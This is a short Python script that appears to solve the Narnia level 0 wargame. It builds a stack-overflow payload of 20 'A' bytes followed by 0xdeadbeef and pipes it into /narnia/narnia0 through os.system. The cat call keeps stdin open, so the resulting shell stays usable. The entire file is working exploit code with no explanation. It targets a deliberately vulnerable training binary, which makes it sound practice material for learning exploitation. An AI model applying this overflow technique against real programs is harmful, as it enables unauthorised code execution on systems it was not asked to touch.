import base64
import os

buffer = b"A" * 20
ret = b"\xef\xbe\xad\xde"
# 0xdeadbeef
result = buffer + ret
payload = base64.b64encode(result).decode()
cmd = "(echo {0} | base64 -d;cat;) | /narnia/narnia0".format(payload)

os.system(cmd)
